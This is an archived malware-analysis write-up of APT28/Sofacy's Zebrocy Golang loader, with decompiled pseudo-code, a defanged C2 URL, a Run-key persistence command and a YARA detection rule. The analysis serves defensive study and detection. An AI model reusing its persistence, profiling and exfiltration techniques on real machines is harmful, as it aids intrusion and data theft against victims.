{
    "id": "5584a686-4811-4c9d-a4fd-cd2aa3b75612",
    "created_at": "2023-01-12T15:10:38.179059Z",
    "updated_at": "2025-03-27T02:17:11.78284Z",
    "deleted_at": null,
    "sha1_hash": "926b1b059475fe65cd6eedaa8a10827a5b1cd1c0",
    "title": "2018-12-21 - Let's Learn- In-Depth on APT28-Sofacy Zebrocy Golang Loader",
    "authors": "",
    "file_creation_date": "2022-05-28T04:40:18Z",
    "file_modification_date": "2022-05-28T04:40:18Z",
    "file_size": 131097,
    "plain_text": "# Let's Learn: In-Depth on APT28/Sofacy Zebrocy Golang Loader\n\n**[vkremez.com/2018/12/lets-learn-dissecting-apt28sofacy.html](https://www.vkremez.com/2018/12/lets-learn-dissecting-apt28sofacy.html)**\n\n**Goal: Reverse engineer the latest APT28/Sofacy Zebrocy loader, coded in the Go**\nprogramming language, oftentimes referred to Golang.\n\n[#Sofacy uses a variant of](https://twitter.com/hashtag/Sofacy?src=hash&ref_src=twsrc%5Etfw) [#Zebrocy written in the Go language in recent attacks](https://twitter.com/hashtag/Zebrocy?src=hash&ref_src=twsrc%5Etfw)\n[https://t.co/iuNuMwClWq](https://t.co/iuNuMwClWq) [pic.twitter.com/zqYTi7UlKZ](https://t.co/zqYTi7UlKZ)\n[— Robert Falc (@r0bf4lc) December 18, 2018](https://twitter.com/r0bf4lc/status/1075166499436986368?ref_src=twsrc%5Etfw)\n\n**Source:**\n\nUPX-packed APT28/Sofacy Zebrocy Loader (MD5: 602d2901d55c2720f955503456ac2f68)\n\n**Outline:**\n```\nI. Background & Summary\nII. Zebrocy main* Functions\nA. main_init\nB. main_main\nC. main_Parse\nIII. Yara Signature\n\n```\n**Analysis:**\n\n**I. Background & Summary**\n\nPalo Alto Unit 42 recently discovered and reported one of the latest Sofacy/APT28 group's\nZebrocy samples, compiled in the Golang programming language. This group is also known\nas Fancy Bear, STRONTIUM, Pawn Storm, and Sednit.\n\n[I recommend reading research by Robert Falcone and Unit 42 titled \"Sofacy Creates New](https://twitter.com/r0bf4lc)\n‘Go’ Variant of Zebrocy Tool.\" This new twist of leveraging Golang for malware compilation\ncomplicates binary analysis and comparison across other samples as the group deploys\nquite a bit with programming languages such as Delphi and C#.\n\nBy and large, analysis reveals that this Zebrocy version is unsophisticated and heavily relies\non various Golang open source code templates from GitHub\n[including iamacarpet/go_win64api (ProcessList, InstalledSoftwareList,](https://github.com/iamacarpet/go-win64api)\n[ListLoggedInUsers,SessionDetails/FullUser), shirou_gopsutil (host_Info),](https://github.com/shirou/gopsutil)\n[and kbinani/screenshot (NumActiveDisplays, GetDisplayBounds, CaptureRect). The](https://github.com/kbinani/screenshot)\n[malware capabilities include installation in HKCU registry as \"Media Center Extender](https://attack.mitre.org/techniques/T1060/)\nService\" and locally in %LOCALAPPDATA%, execution via \"cmd\", profiling a victim system,\n[obtaining desktop screenshots, and sending the data to the server. The original Golang](https://attack.mitre.org/techniques/T1113/)\nZebrocy project contains the following debugging path\n\"C:/!Project/C1/ProjectC1Dec/main.go\" with the \"ProjectC1Dec\" name.\n\n[Thanks to the released Golang IDA code script helpers developed by George Zaytsev this](https://2016.zeronights.ru/wp-content/uploads/2016/12/GO_Zaytsev.pdf)\n\n\n-----\n\nmalware introduced an interesting angle allowing to dive deeper into reversing of this\nZebrocy Golang loader.\n**II. Zebrocy main* Functions**\nEssentially, Zebrocy Golang loader is, by and large, a slightly modified copy/paste code from\nGitHub related to various open source Golang libraries. For example, the open source\nGolang code to retrieve a list of loggedInUsers is as follows:\n```\npackage main\nimport (\n  \"fmt\"\n  wapi \"github.com/iamacarpet/go-win64api\"\n)\nfunc main(){\n  // This check runs best as NT AUTHORITY\\SYSTEM\n  //\n  // Running as a normal or even elevated user,\n  // we can't properly detect who is an admin or not.\n  //\n  // This is because we require TOKEN_DUPLICATE permission,\n  // which we don't seem to have otherwise (Win10).\n  users, err := wapi.ListLoggedInUsers()\n  if err != nil {\n    fmt.Printf(\"Error fetching user session list.\\r\\n\")\n    return\n  }\n  fmt.Printf(\"Users currently logged in (Admin check doesn't work for AD\nAccounts):\\r\\n\")\n  for _, u := range users {\n    fmt.Printf(\"\\t%-50s - Local User: %-5t - Local Admin: %t\\r\\n\", \\\nu.FullUser(), u.LocalUser, u.LocalAdmin)\n  }\n}\n\n```\nThis same code is copied and embedded as part of the malware main_Session_List routine\nas observed in pseudo-code.\n\nThe Golang version of the malware consists of the following 16 main_* named functions and\ntheir detailed descriptions:\n\n**Golang Function Name** **Description**\n\n\n-----\n\nmain_GetDisk get disk via \"cmd\"\n\nmain_Getfilename obtain path to \"%LOCALAPPDATA%\\Microsoft\\Feeds\\\n{5588ACFD-6436-411B-A5CE666AE6A92D3D}\\wcncsvc.exe\"\n\nmain_CMDRunAndExit execute a file and exit via \"cmd\"\n\nmain_Tasklist retrieve process list via iamacarpet/go_win64api/ProcessList\nmethod\n\nmain_Installed retrieve installed software via\niamacarpet_go_win64api_InstalledSoftwareList method\n\nmain_Session_List retrieve active session list (logged in users + Run-As users)\nvia iamacarpet/go_win64api/ListLoggedInUsers method\n\nmain_List_Local_Users retrieve a formatted list of local users via theListLocalUsers\nmethod\n\nmain_systeminformation retrieve host information via shirou/gopsutil/host_Info method\n\nmain_CreateSysinfo concatenate and format all the victim data from\nmain_Tasklist, main_GetDisk, time_time_Now,\nmain_Installed, main_Session_List, main_List_Local_Users,\nand time_Time_Format.\n\nmain_ParseData call main_Getfilename and create a copy of itself in\n%LOCALAPPDATA% and creates a registry key via cmd\n\"reg add\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v\nMedia Center Extender Service,/d\"\n\nmain_SendPOSTRequests send a server POST request, call time_Sleep(4230196224,\n6) and if after 19 attempts, exits via os.exit, otherwise call\nmain_main, then main_ParseData, and main_ParseData,\nmain_CMDRunAndExit.\n\nmain_Screen take a screenshot of the desktop\n\nmain_GetSND get stdin from \"cmd\"\n\nmain_PrcName get path to itself process\n\nmain_main run the main function of the Golang Zebrocy\n\nmain_init initialize main structures necessary for Golang malware\nexecution\n\n**A. main_init**\nThe malware starts with initializes various libraries necessary for Golang execution (net,\n\n\n-----\n\nencoding, regular expressions, and necessary reliant GitHub project libraries). The C++\npseudo-coded Golang malware routine is as follows:\n```\n//////////////////////////////////////////\n////// APT28 Golang Zebrocy main_init ////\n//////////////////////////////////////////\nint main_init()\n{\n if ( (unsigned int)&_0 <= *(_DWORD *)(*(_DWORD *)__readfsdword(20) + 8) )\n  runtime_morestack_noctxt();\n result = (unsigned __int8)byte_8625A6;\n if ( (unsigned __int8)byte_8625A6 <= 1u )\n {\n  if ( byte_8625A6 == 1 )\n   runtime_throwinit();\n  byte_8625A6 = 1;\n  bytes_init();\n  encoding_hex_init(); // hex_encode init\n  fmt_init(); // fmt init \n  image_jpeg_init(); // image jpeg init\n  io_ioutil_init(); // io util\n  net_http_init(); // http util \n  net_url_init(); // net url\n  os_init(); // os init \n  os_exec_init(); // os exec init\n  path_filepath_init(); // file path init\n  regexp_init(); // regular expressions oinit\n  strings_init(); // string init\n  syscall_init(); // syscall init\n  time_init(); // timer init\n  github_com_iamacarpet_go_win64api_init(); // golang enumerate lib\n  github_com_kbinani_screenshot_init(); // golang screenshot lib\n  result = github_com_shirou_gopsutil_host_init(); // go host enum lib\n  byte_8625A6 = 2;\n }\n return result;\n}\n\n```\n**B. main_main**\nThe main_main function calls initialize other important main calls\nretrieving the path to the process of itself, obtaining cmd stdin output, retrieving system\ninformation, making a screenshot, and sending POST requests to the main command-andcontrol server.\nThe pseudo-coded C++ code is as follows:\n\n\n-----\n\n```\n//////////////////////////////////////////\n////// APT28 Golang Zebrocy main_main ////\n//////////////////////////////////////////\nint main_main()\n{\n...\n if ( (unsigned int)&retaddr <= *(_DWORD *)(*(_DWORD *)__readfsdword(20) + 8) )\n  runtime_morestack_noctxt();\n main_PrcName(); // get path to itself\n strings_Contains(v1, v3, &byte_66EE33, 6);  // \"comsvccookie\"\n if ( v5 )\n {\n  // get Cmd_Stdin pipe\n  main_GetSND(v10, v12);\n  v1 = v0;\n  v3 = v2;\n  // retrieve system info\n  main_CreateSysinfo();\n  v4 = v0;\n  v5 = v2;\n  // retrieve screenshot\n  main_Screen(v2, v0);\n  // \"hxxp://89[.]37[.]226[.]123/advance/portable_version/service[.]php\"\n  result = main_SendPOSTRequests((int)domain, 57, v2, v4, v2, v4, v2, v4);\n }\n else\n {\n  result = main_SendPOSTRequests(\n        (int)&word_673186,    // http://google.comif-modified-since\n        17,\n        (int)\"01456:;<=>?@BCLMNOPSZ[\\\"\\\\\\n\\r\\t\",\n        1,\n        (int)\"1456:;<=>?@BCLMNOPSZ[\\\"\\\\\\n\\r\\t\",\n        1,\n        (int)\"1456:;<=>?@BCLMNOPSZ[\\\"\\\\\\n\\r\\t\",\n        1);\n }\n return result;\n}\n\n```\n**C. main_Parse**\nThe main_Parse function serves as the main persistency script writing the binary to\n%LOCALAPPDATA% and adding itself\nto HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run as \"Media Center Extender\nService.\"\n\n\n-----\n\n```\n//////////////////////////////////////////\n////// APT28 Golang Zebrocy main_ParseData ////\n//////////////////////////////////////////\nint __cdecl main_ParseData(int a1, int a2)\n{ \n// Get %LOCALAPPDA% new file path \n//\"%LOCALAPPDATA%\\Microsoft\\Feeds\\{5588ACFD-6436-411B-A5CE-666AE6A92D3D}\\wcncsvc.exe\"\nmain_Getfilename();\n v24 = v2;\n v25 = v3;\n os_Create(v3, v2);\n if ( runtime_deferproc(12, off_68613C) )\n {\n  result = runtime_deferreturn(v11);\n }\n else\n {\n  // Write itself to the specified path \n  io_ioutil_WriteFile(v25, v24, v14, v17, v18, 420, v21);\n  ((void (*)(void))loc_44CDC8)();\n  v30 = v25;\n  v31 = v24;\n  os_exec_Command((int)&cmd, 3, (int)&v29, 2, 2);\n  runtime_newobject(obj_byte);\n  *v12 = 1;\n  v4 = v19;\n  v5 = *(_BYTE *)v19;\n  if ( dword_862D30 )\n   runtime_gcWriteBarrier(v19);\n  else\n   *(_DWORD *)(v19 + 76) = v12;\n  os_exec__ptr_Cmd_Run(v4, v12, v15);\n  ((void (*)(void))loc_44CDC8)();\n// \"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \n// /v Media Center Extender Service /d\"\n  runtime_concatstring3(0, (unsigned int)dword_682308, 96, v25, v24, &word_66E71E,\n4, v22);\n  v27 = v6;\n  v28 = v23;\n  os_exec_Command((int)&cmd, 3, (int)&v26, 2, 2);\n  runtime_newobject(obj_byte);\n  *v13 = 1;\n  v7 = v20;\n  v8 = *(_BYTE *)v20;\n  if ( dword_862D30 )\n   runtime_gcWriteBarrier(v20);\n...\n}\n\n```\n**III. Yara Signature**\n\n\n-----\n\n```\nrule apt28_win_zebrocy_golang_loader {\n  meta:\n   description = \"Detects unpacked APT28/Sofacy Zebrocy Golang.\"\n   author = \"@VK_Intel\"\n   date = \"2018-12-21\"\n   hash = \"15a866c3c18046022a810aa97eaf2e20f942b8293b9cb6b4d5fb7746242c25b7\"\n  strings:\n   // main_init\n   $x0 = {6d 61 69 6e 2e 69 6e 69 74} \n   // main_main\n   $x1 = {6D 61 69 6e 2e 6d 61 69 6e} \n   // main_Parse\n   $x2 = {6d 61 69 6e 2e 50 61 72 73 65 44 61 74 61}\n   // main.GetSND\n   $x3 = {6d 61 69 6e 2e 47 65 74 53 4e 44}\n   // main.PrcName\n   $x4 = {6d 61 69 6e 2e 50 72 63 4e 61 6d 65}\n  condition: \n   ( uint16(0) == 0x5a4d and\n     ( 4 of ($x*) )\n   )\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-12-21 - Let's Learn- In-Depth on APT28-Sofacy Zebrocy Golang Loader.pdf"
    ],
    "report_names": [
        "2018-12-21 - Let's Learn- In-Depth on APT28-Sofacy Zebrocy Golang Loader.pdf"
    ],
    "threat_actors": [
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536238,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653712818,
    "ts_modification_date": 1653712818,
    "files": {
        "pdf": "https://archive.orkl.eu/926b1b059475fe65cd6eedaa8a10827a5b1cd1c0.pdf",
        "text": "https://archive.orkl.eu/926b1b059475fe65cd6eedaa8a10827a5b1cd1c0.txt",
        "img": "https://archive.orkl.eu/926b1b059475fe65cd6eedaa8a10827a5b1cd1c0.jpg"
    }
}